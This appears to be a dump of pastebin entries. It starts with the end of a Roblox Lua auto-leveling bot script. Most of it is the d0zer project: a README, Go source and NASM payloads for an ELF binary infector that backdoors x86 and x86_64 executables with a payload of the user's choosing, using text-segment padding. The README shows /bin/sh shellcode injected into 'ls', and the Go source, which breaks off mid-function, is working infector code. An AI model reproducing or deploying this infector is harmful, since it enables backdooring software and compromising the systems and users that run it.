            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""No""
                }
            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait(0.7)
            local ChatStart = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart
            ChatStart:FireServer(
                workspace.FriendlyNPCs[""Elder Kai""]
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""Yes""
                }
            )
            wait(0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
        wait(2)
    elseif tonumber(Player.PlayerGui.HUD.Bottom.Stats.LVL.Val.Text) > 54 then
        print(""LEVEL 55+"")
    end
end

print(""STARTING"")

while wait() do
    task.wait(1)
    pcall(function()
        if NPCs:FindFirstChild(""KAMI"") then
            repeat task.wait()
                repeat wait() until Race
                if Race.Value == ""Namekian"" then
                task.wait(4.65)
                print(""NAMEK"")
                    level()
                    repeat task.wait()
                    Player.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = NPCs:FindFirstChild(""Character Slot Changer"")})) until Chat.Visible == true
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (Settings.Normal)}}))
                    wait(.33)
                    pcall(function()
                        print(""KAMI"")
                        Player.Backpack.ServerTraits.ChatStart:FireServer(NPCs[""KAMI""].Chat)
                    end)
                    task.wait(4.65)
                    print(""OTHER"")
                    repeat task.wait()
                    Player.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = NPCs:FindFirstChild(""Character Slot Changer"")})) until Chat.Visible == true
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (Settings.Namek)}}))
                elseif Race.Value ~= ""Namekian"" then
                    task.wait(4.65)
                    print(""OTHER"")
                    repeat task.wait()
                    Player.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = NPCs:FindFirstChild(""Character Slot Changer"")})) until Chat.Visible == true
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (Settings.Namek)}}))
                    task.wait(4.65)
                    print(""NAMEK"")
                    level()
                    repeat task.wait()
                    Player.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = NPCs:FindFirstChild(""Character Slot Changer"")})) until Chat.Visible == true
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (Settings.Normal)}}))
                    wait(.33)
                    pcall(function()
                        print(""KAMI"")
                        Player.Backpack.ServerTraits.ChatStart:FireServer(NPCs[""KAMI""].Chat)
                    end)
                end
            until not NPCs:FindFirstChild(""KAMI"") or Chat.TextLabel.Text == ""Mr Popo is a nice guy"" or game.ReplicatedStorage.Hidden:FindFirstChild(""KAMI"")
            print(""RESET"")
            reset()
        elseif not NPCs:FindFirstChild(""KAMI"") or Chat.TextLabel.Text == ""Mr Popo is a nice guy"" or game.ReplicatedStorage.Hidden:FindFirstChild(""KAMI"") then
            print(""RESET"")
            reset()
        end
    end)
end"
LMma8pup,README,FlyFar,Email,Sunday 18th of June 2023 10:55:57 AM CDT,"d0zer
Elf binary infector written in Go. It can be used for infecting executables of type ET_DYN and ET_EXEC with a payload of your creation. Utilizing the classic elf text segment padding algorithm by Silvio Cesar, your payload (parasite) will run before native functionality of the binary effectively backooring the binary.

d0zer currently allows for up to a page size payload (4096 bytes). It is capable of infecting both x86_32 and x86_64 elf executable binaries executables.

Motivation
My motivations are quite simple, I like doing interesting things with the ELFs and binary infection of a target requires a decent amount of overhead knowledge and skill as a prerequisite to perform it (TO ME), so I set out to learn from papers, books and specs from the past (see references), throwed Golang in the middle for increased difficulty and here I am.

build
 
[sad0p@Arch-Deliberate d0zer]$ go version
go version go1.16.3 gccgo (GCC) 11.1.0 linux/amd64
[sad0p@Arch-Deliberate d0zer]$ go build d0zer.go epiloguejmp.go 
Usage
[sad0p@Arch-Deliberate d0zer]$ ./d0zer --help
Usage of ./d0zer:
  -debug
    	see debug output (generated payload, modifications, etc)
  -noPreserve
    	prevents d0zer from prepending its register preservation routine to your payload
  -noRestoration
    	prevents d0zer from appending register restoration routine to your payload
  -noRetOEP
    	prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload
  -payloadBin string
    	path to binary containing payload
  -payloadEnv string
    	name of the environmental variable holding the payload
  -target string
    	path to binary targetted for infection
[sad0p@Arch-Deliberate d0zer]$ 
Basic demo (benign) infection can be accomplished with ./dozer -target [path-to-target].

 
[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls
[sad0p@Arch-Deliberate d0zer]$ experimental/ls-infected
hello -- this is a non destructive payloadd0zer	     epiloguejmp.go  jmp-to-oep32      jmp-to-oep.o		  non-destructive-payload32.asm  non-destructive-payload64.o  shellcode.c
d0zer.go     experimental    jmp-to-oep32.asm  LICENSE			  non-destructive-payload32.o	 output			      test
elf64	     genpayload.go   jmp-to-oep32.o    non-destructive-payload	  non-destructive-payload64	 README.md		      test.go
epiloguejmp  jmp-to-oep      jmp-to-oep.asm    non-destructive-payload32  non-destructive-payload64.asm  shellcode
[sad0p@Arch-Deliberate d0zer]$ 
Supplying -debug allows you to see each step of the infection algorithm at work aswell as a hexdump of the payload as it will be in the binary.

[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -debug
[+] Modified entry point from 0x5b20 -> 0x173d1
[+] Text segment starts @ 0x4000
[+] Text segment ends @ 0x173d1
[+] Payload size pre-epilogue 0x5c
[+] Payload size post-epilogue 0x90
------------------PAYLOAD----------------------------
00000000  50 51 53 52 56 57 55 54  41 50 41 51 41 52 41 53  |PQSRVWUTAPAQARAS|
00000010  41 54 41 55 41 56 41 57  eb 00 e8 2b 00 00 00 68  |ATAUAVAW...+...h|
00000020  65 6c 6c 6f 20 2d 2d 20  74 68 69 73 20 69 73 20  |ello -- this is |
00000030  61 20 6e 6f 6e 20 64 65  73 74 72 75 63 74 69 76  |a non destructiv|
00000040  65 20 70 61 79 6c 6f 61  64 0a b8 01 00 00 00 bf  |e payload.......|
00000050  01 00 00 00 5e ba 2a 00  00 00 0f 05 41 5f 41 5e  |....^.*.....A_A^|
00000060  41 5d 41 5c 41 5b 41 5a  41 59 41 58 5c 5d 5f 5e  |A]A\A[AZAYAX\]_^|
00000070  5a 5b 59 58 e8 12 00 00  00 48 83 e8 79 48 2d d1  |Z[YX.....H..yH-.|
00000080  73 01 00 48 05 20 5b 00  00 ff e0 48 8b 04 24 c3  |s..H. [....H..$.|
--------------------END------------------------------
[+] Generated and appended position independent return 2 OEP stub to payload
[+] Increased text segment p_filesz and p_memsz by 144 (length of payload)
[+] Adjusting segments after text segment file offsets by 0x1000
Inceasing pHeader @ index 4 by 0x1000
Inceasing pHeader @ index 5 by 0x1000
Inceasing pHeader @ index 6 by 0x1000
Inceasing pHeader @ index 8 by 0x1000
Inceasing pHeader @ index 10 by 0x1000
[+] Increasing section header addresses if they come after text segment
[+] Extending section header entry for text section by payload len.
[+] (15) Updating sections past text section @ addr 0x18000
[+] (16) Updating sections past text section @ addr 0x1d324
[+] (17) Updating sections past text section @ addr 0x1dc78
[+] (18) Updating sections past text section @ addr 0x21fd0
[+] (19) Updating sections past text section @ addr 0x21fd8
[+] (20) Updating sections past text section @ addr 0x21fe0
[+] (21) Updating sections past text section @ addr 0x22a58
[+] (22) Updating sections past text section @ addr 0x22c58
[+] (23) Updating sections past text section @ addr 0x23000
[+] (24) Updating sections past text section @ addr 0x23280
[+] (25) Updating sections past text section @ addr 0x0
[+] (26) Updating sections past text section @ addr 0x0
[+] writing payload into the binary
A custom payload can be injected into the binary with the -payloadEnv flag. Below I inject a basic execve /bin/sh shellcode into the ls command as an example.

[sad0p@Arch-Deliberate d0zer]$ export DOZEREGG=""\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05""
[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -payloadEnv DOZEREGG
[sad0p@Arch-Deliberate d0zer]$ experimental/ls-infected
sh-5.1$ 
The -payloadBin flag is currently not implemented, it would allow you to supply a PIE (binary), where the contents of the text segments would serve as the payload.

[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -payloadBin ./non-destructive-payload64
Getting payload from an ELF binary .text segment is not yet supported
[sad0p@Arch-Deliberate d0zer]$ 
Advance Usage
In the event you don't like the routines d0zer add to your code the following flags can be utilized, however your payload should handle any consequences that come comes from removing them.

The -noPreserve flag removes the general purpose register preservation routine. For x86_32 targets this is accomplished via a pushad instruction. For x86_64 targets, all general purpose registers are manually pushed onto the stack as the the pushad instruction in x86_64 is not valid. The overall purpose of this routine is to preserve register states after execution of your payload, when control is handed back to libc runtime routine (OEP) it expects certain register values in order to properly execute. In some contexts, I was able to simply preserve the RDX register and no crashes occured, in others (using shellcode I downloaded) preserving RDX was not enough. So in order to stay ""portable"", I thought it was wise to save all state as I wasn't completely sure which registers were needed currently or in the future.

The -noRestoration flag removes the restoration routine, which is the opposite of the preservation routine, it performs a popa for x86_32 targets and a manual popping of each general purpose register from the stack.

The -noRetOEP flag removes the ""return to original entry point"" routine. This stub enables portability across pie (ET_DYN) and non-pie (ET_EXEC) elf executables. The code extracts the randomized base address by capturing the current instuction pointer value in accumulator register. It then substracts the payload length from the accumulator (+ 5 bytes for the relative call instruction), then subtracts the entry point of payload. Finally it adds the offset of the binaries OEP to then perform a jmp rax or jmp eax (for x86_32) instruction to start executing native/non-parasitic code. If you intend on handling this your self then your code must handle proper exiting/continuation of the binary to avoid SIGSEGV.

All preservation, restoration and ret-2-oep shellcode are heavily commented for clarity. Restoration and preservation stubs can be found at the top of the d0zer.go source file. The ret2OEP routine can be found in epilogue.go.

Payload considerations
It's worth noting that code being injected (payload/parasite) should be position independent. Additionally with in your payload anything pushed onto the stack should be popped off if you choose to use restoration and preservations stubs (which d0zer prepends & appends by default). Due to the stacks LIFO structure, should anything (except the register values pushed in the preservation stub)be on there after you've executed your payload you run the risk of getting a SIGSEGV in the libc runtime routine.

References
Linux Binary Analysis by Ryan Oneil (Elfmaster), see virus technology chapter.

LPV (a unix virus) written in C utilizing the same algorithm as d0zer written by Elfmaster.
https://bitlackeys.org/projects/lpv.c

Unix ELF parasites and viruses - by Silvio Cesar
https://vx-underground.org/archive/VxHeaven/lib/vsc01.html

Return To Original Entry Point Despite PIE - by s0lden
https://tmpout.sh/1/11.html"
RDRiiK58,epiloguejmp.go,FlyFar,Go,Sunday 18th of June 2023 10:55:18 AM CDT,"package main

import(
	""encoding/binary""
	""bytes""
)

/*
	x64 - pEntry uint64 / oEntry uint64
	x86 - pEntry uint32 / oEntry uint32
*/
func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
	/*
	;Example of what the final payload can look like
	epilog := []byte{
		0xe8, 0x12, 0x00, 0x00, 0x00, 		//call   401061 <get_eip>
		0x48, 0x83, 0xe8, 0x4f, 			//sub    $0x4f,%rax
		0x48, 0x2d, 0xd1, 0x73, 0x01, 0x00, //sub    $0x173d1,%rax
		0x48, 0x05, 0x20, 0x5b, 0x00, 0x00, //add    $0x5b20,%rax
		0xff, 0xe0, 						//jmp    *%rax
											//0000000000401061 <get_eip>:
		0x48, 0x8b, 0x04, 0x24, 			//mov    (%rsp),%rax
		0xc3, 								//ret
	}
	*/

	encPsize := make([]byte, 4)
	binary.LittleEndian.PutUint32(encPsize, uint32(pSize))
	var numZeros uint32 = 0 
	for _, b := range encPsize {
		if b != 0x00 {
			numZeros++
		}
	}

	var incOff uint32
	switch pEntry.(type) {
	case uint64:
		incOff = 0x12 
	case uint32:
		incOff = 0xf
	}
	incOff += (numZeros - 1)

	var shellcode bytes.Buffer;
	shellcode.Write([]byte{0xe8}) //call instruction
	
	//encode the offset
	encOff := make([]byte, 4)
	binary.LittleEndian.PutUint32(encOff, incOff)

	//write offset for call instruction
	shellcode.Write(encOff)

	// (x64) - sub rax, encPsize
	// (x86) - sub eax, encPsize
	switch oEntry.(type) {
	case uint64:
		shellcode.Write([]byte{0x48, 0x83, 0xe8})
	case uint32:
		shellcode.Write([]byte{0x83, 0xe8})
	} 
	shellcode.Write(encPsize[:numZeros])
	
	//	(x64) - sub rax, pEntry
	//	(x86) - sub eax, pEntry
	encPentry := make([]byte, 4)
	switch v := pEntry.(type) {
	case uint64:
		binary.LittleEndian.PutUint32(encPentry, uint32(v))
		shellcode.Write([]byte{0x48, 0x2d})
	case uint32:
		binary.LittleEndian.PutUint32(encPentry, v)
		shellcode.Write([]byte{0x2d})
	}
	shellcode.Write(encPentry)

	// (x64) - add rax, oEntry
	// (x86) - add eax, oEntry
	encOentry := make([]byte, 4)
	switch v := oEntry.(type) {
	case uint64:
		binary.LittleEndian.PutUint32(encOentry, uint32(v))
		shellcode.Write([]byte{0x48, 0x05})
	case uint32:
		binary.LittleEndian.PutUint32(encOentry, v)
		shellcode.Write([]byte{0x05})
	}
	shellcode.Write(encOentry)

	switch oEntry.(type) {
	case uint64:
		/* --- write -- */
		//jmp rax
		//mov rax, [rsp]
		//ret
		shellcode.Write([]byte{0xff, 0xe0, 0x48, 0x8b, 0x04, 0x24, 0xc3})
	case uint32:
		/* --- write -- */
		//jmp eax
		//mov eax, [esp]
		//ret
		shellcode.Write([]byte{0xff, 0xe0, 0x8b, 0x04, 0x24, 0xc3})
	}
	return shellcode.Bytes()
}"
xFGZ6XLg,non-destructive-payload32.asm,FlyFar,ASM (NASM),Sunday 18th of June 2023 10:54:38 AM CDT,"    global _start
    section .text

_start:
    jmp message

message:
    call shellcode
    db ""The only antidote to mental suffering is physical pain - Karl Marx"", 0xa

shellcode:
    pop ecx
    mov ebx, 1
    mov edx, 0x2a
    mov eax, 4
    int 0x80

    ;mov eax, 1
    ;mov ebx, 0
    ;int 0x80"
eTr6wbS7,non-destructive-payload64.asm,FlyFar,ASM (NASM),Sunday 18th of June 2023 10:53:53 AM CDT,"        global _start

        section .text

_start:
	jmp message

message: 
	call shellcode
	db ""The only antidote to mental suffering is physical pain - Karl Marx"", 0xa

shellcode:
	mov rax, 0x1 		;write system call
	mov rdi, 0x1      	;stdout fd

	pop rsi				;make rsi a ptr to message
	mov rdx, 0x2a 		;message length
	syscall			

	;xor rdi, rdi		; 0 return status
	;xor rax, rax
	;mov al, 0x3c		; syscall for exit
	;syscall 



"
2GDVDwbc,d0zer.go,FlyFar,Go,Sunday 18th of June 2023 10:52:40 AM CDT,"package main

import (
	""bytes""
	""debug/elf""
	""encoding/binary""
	""encoding/hex""
	""errors""
	""flag""
	""fmt""
	""io""
	""io/ioutil""
	""log""
	""os""
	""strings""
)

const (
	PAGE_SIZE                       int    = 4096
	MOD_ENTRY_POINT                 string = ""[+] Modified entry point from 0x%x -> 0x%x\n""
	TEXT_SEG_START                  string = ""[+] Text segment starts @ 0x%x\n""
	TEXT_SEG_END                    string = ""[+] Text segment ends @ 0x%x\n""
	PAYLOAD_LEN_PRE_EPILOGUE        string = ""[+] Payload size pre-epilogue 0x%x\n""
	PAYLOAD_LEN_POST_EPILOGUE       string = ""[+] Payload size post-epilogue 0x%x\n""
	GENERATE_AND_APPEND_PIC_STUB    string = ""[+] Generated and appended position independent return 2 OEP stub to payload""
	INCREASED_TEXT_SEG_P_FILESZ     string = ""[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n""
	ADJUST_SEGMENTS_AFTER_TEXT      string = ""[+] Adjusting segments after text segment file offsets by 0x%x\n""
	INCREASE_PHEADER_AT_INDEX_BY    string = ""Inceasing pHeader @ index %d by 0x%x\n""
	INCREASE_SECTION_HEADER_ADDRESS string = ""[+] Increasing section header addresses if they come after text segment""
	UPDATE_SECTIONS_PAST_TEXT_SEG   string = ""[+] (%d) Updating sections past text section @ addr 0x%x\n""
	EXTEND_SECTION_HEADER_ENTRY     string = ""[+] Extending section header entry for text section by payload len.""
)

type enumIdent struct {
	Endianness binary.ByteOrder
	Arch       elf.Class
}

type targetBin struct {
	Filesz   int64
	Contents []byte
	//tName string
	Ident   []byte
	EIdent  enumIdent
	Hdr     interface{}
	Shdrs   interface{}
	Phdrs   interface{}
	Fh      *os.File
	Payload bytes.Buffer
}

var preserve64 = []byte{
	0x50,       //push   %rax
	0x51,		//push   %rcx
	0x53,       //push   %rbx
	0x52,       //push   %rdx
	0x56,       //push   %rsi
	0x57,       //push   %rdi
	0x55,       //push   %rbp
	0x54,       //push   %rsp
	0x41, 0x50, //push   %r8
	0x41, 0x51, //push   %r9
	0x41, 0x52, //push   %r10
	0x41, 0x53, //push   %r11
	0x41, 0x54, //push   %r12
	0x41, 0x55, //push   %r13
	0x41, 0x56, //push   %r14
	0x41, 0x57, //push   %r15
}

var restoration64 = []byte{
	0x41, 0x5f, //pop    %r15
	0x41, 0x5e, //pop    %r14
	0x41, 0x5d, //pop    %r13
	0x41, 0x5c, //pop    %r12
	0x41, 0x5b, //pop    %r11
	0x41, 0x5a, //pop    %r10
	0x41, 0x59, //pop    %r9
	0x41, 0x58, //pop    %r8
	0x5c, //pop    %rsp
	0x5d, //pop    %rbp
	0x5f, //pop    %rdi
	0x5e, //pop    %rsi
	0x5a, //pop    %rdx
	0x5b, //pop    %rbx
	0x59, //pop    %rcx
	0x58, //pop    %rax
}

var defaultPayload64 = []byte{
	0xeb, 0x00, //jmp    401005 <message>
	//0000000000401005 <message>:
	0xe8, 0x2b, 0x00, 0x00, 0x00, //call   401035 <shellcode>
	0x68, 0x65, 0x6c, 0x6c, 0x6f, //push   $0x6f6c6c65
	0x20, 0x2d, 0x2d, 0x20, 0x74, 0x68, //and    %ch,0x6874202d(%rip)        # 68b43042 <__bss_start+0x68741042>
	0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, //imul   $0x61207369,0x20(%rbx),%esi
	0x20, 0x6e, 0x6f, //and    %ch,0x6f(%rsi)
	0x6e,                   //outsb  %ds:(%rsi),(%dx)
	0x20, 0x64, 0x65, 0x73, //and    %ah,0x73(%rbp,%riz,2)
	0x74, 0x72, //je     401098 <get_eip+0x37>
	0x75, 0x63, //jne    40108b <get_eip+0x2a>
	0x74, 0x69, //je     401093 <get_eip+0x32>
	0x76, 0x65, //jbe    401091 <get_eip+0x30>
	0x20, 0x70, 0x61, //and    %dh,0x61(%rax)
	0x79, 0x6c, //jns    40109d <get_eip+0x3c>
	0x6f,       //outsl  %ds:(%rsi),(%dx)
	0x61,       //(bad)
	0x64, 0x0a, //or     %fs:0x1(%rax),%bh

	//0000000000401035 <shellcode>:
	0xb8, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%eax
	0xbf, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%edi
	0x5e,                         //pop    %rsi
	0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
	0x0f, 0x05, //syscall
}

var preserve32 = []byte{0x60} //pusha

var restoration32 = []byte{0x61} //popa

var defaultPayload32 = []byte{
	0xeb, 0x00, //jmp    8049002 <message>
	//08049002 <message>:
	0xe8, 0x2b, 0x00, 0x00, 0x00, //call   8049032 <shellcode>
	0x68, 0x65, 0x6c, 0x6c, 0x6f, //push   $0x6f6c6c65
	0x20, 0x2d, 0x2d, 0x20, 0x74, 68, //and    %ch,0x6874202d
	0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, //imul   $0x61207369,0x20(%ebx),%esi
	0x20, 0x6e, 0x6f, //and    %ch,0x6f(%esi)
	0x6e,                         //outsb  %ds:(%esi),(%dx)
	0x2d, 0x64, 0x65, 0x73, 0x74, //sub    $0x74736564,%eax
	0x72, 0x75, //jb     8049099 <shellcode+0x67>
	0x63, 0x74, 0x69, 0x76, //arpl   %si,0x76(%ecx,%ebp,2)
	0x65, 0x20, 0x70, 0x61, //and    %dh,%gs:0x61(%eax)
	0x79, 0x6c, //jns    804909a <shellcode+0x68>
	0x6f, //outsl  %ds:(%esi),(%dx)
	0x61, //popa
	0x64, //fs
	0x0a, //.byte 0xa
	//08049032 <shellcode>:
	0x59,                         //pop    %ecx
	0xbb, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%ebx
	0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
	0xb8, 0x04, 0x00, 0x00, 0x00, //mov    $0x4,%eax
	0xcd, 0x80, //int    $0x80
}

func printPayload(p []byte) {
	fmt.Println(""------------------PAYLOAD----------------------------"")
	fmt.Printf(""%s"", hex.Dump(p))
	fmt.Println(""--------------------END------------------------------"")
}

func getPayloadFromEnv(p io.Writer, key string) (int, error) {
	val, ok := os.LookupEnv(key)
	if !ok {
		errorString := ""Environmental variable "" + key + "" is not set""
		return 0, errors.New(errorString)
	}

	if val == """" {
		errorString := ""Environmental variable "" + key + "" contains no payload""
		return 0, errors.New(errorString)
	}
	val = strings.ReplaceAll(val, ""\\x"", """")
	decoded, err := hex.DecodeString(val)
	if err != nil {
		log.Fatal(err)
	}

	return p.Write(decoded)
}

func (t *targetBin) isElf() bool {
	t.Ident = t.Contents[:16]
	return !(t.Ident[0] != '\x7f' || t.Ident[1] != 'E' || t.Ident[2] != 'L' || t.Ident[3] != 'F')
}

func (t *targetBin) infectBinary(debug bool, noRestoration bool, noRetOEP bool) error {
	var textSegEnd interface{}
	var oShoff interface{}
	var textNdx int

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		oEntry := t.Hdr.(*elf.Header64).Entry
		oShoff = t.Hdr.(*elf.Header64).Shoff

		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
		pHeaders := t.Phdrs.([]elf.Prog64)
		pNum := int(t.Hdr.(*elf.Header64).Phnum)

		for i := 0; i < pNum; i++ {
			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
				textNdx = i
				t.Hdr.(*elf.Header64).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
				if debug {
					fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
				}

				textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
				if debug {
					fmt.Printf(TEXT_SEG_START, pHeaders[i].Off)
					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint64))
					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
				}
				
				if noRestoration  == false {
					t.Payload.Write(restoration64)
				}

				if noRetOEP == false {
					retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
					t.Payload.Write(retStub)
				}

				if debug {
					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
					printPayload(t.Payload.Bytes())
				}

				t.Phdrs.([]elf.Prog64)[i].Memsz += uint64(t.Payload.Len())
				t.Phdrs.([]elf.Prog64)[i].Filesz += uint64(t.Payload.Len())

				if debug {
					fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
					fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
				}
			}
		}

		if debug {
			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
		}

		for j := textNdx; j < pNum; j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				if debug {
					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
				}
				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
			}
		}

		if debug {
			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
		}
		sectionHdrTable := t.Shdrs.([]elf.Section64)
		sNum := int(t.Hdr.(*elf.Header64).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd.(uint64) {
				if debug {
					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
				}
				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
				if debug {
					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
				}
				t.Shdrs.([]elf.Section64)[k].Size += uint64(t.Payload.Len())
			}
		}

	case elf.ELFCLASS32:
		oEntry := t.Hdr.(*elf.Header32).Entry
		oShoff = t.Hdr.(*elf.Header32).Shoff

		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
		pHeaders := t.Phdrs.([]elf.Prog32)
		pNum := int(t.Hdr.(*elf.Header32).Phnum)

		for i := 0; i < pNum; i++ {
			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
				textNdx = i
				t.Hdr.(*elf.Header32).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
				if debug {
					fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
				}

				textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
				if debug {
					fmt.Printf(TEXT_SEG_START, pHeaders[i].Off)
					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint32))
					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
				}

				if noRestoration == false {
					t.Payload.Write(restoration32)
				}

				if noRetOEP == false {
					retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
					t.Payload.Write(retStub)
				}

				if debug {
					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
					printPayload(t.Payload.Bytes())
				}

				t.Phdrs.([]elf.Prog32)[i].Memsz += uint32(t.Payload.Len())
				t.Phdrs.([]elf.Prog32)[i].Filesz += uint32(t.Payload.Len())

				if debug {
					fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
					fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
				}
			}
		}

		if debug {
			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
		}

		for j := textNdx; j < pNum; j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				if debug {
					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
				}
				t.Phdrs.([]elf.Prog32)[j].Off += uint32(PAGE_SIZE)
			}
		}

		if debug {
			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
		}
		sectionHdrTable := t.Shdrs.([]elf.Section32)
		sNum := int(t.Hdr.(*elf.Header32).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd.(uint32) {
				if debug {
					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
				}
				t.Shdrs.([]elf.Section32)[k].Off += uint32(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header32).Entry {
				if debug {
					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
				}
				t.Shdrs.([]elf.Section32)[k].Size += uint32(t.Payload.Len())
			}
		}
	}

	infected := new(bytes.Buffer)
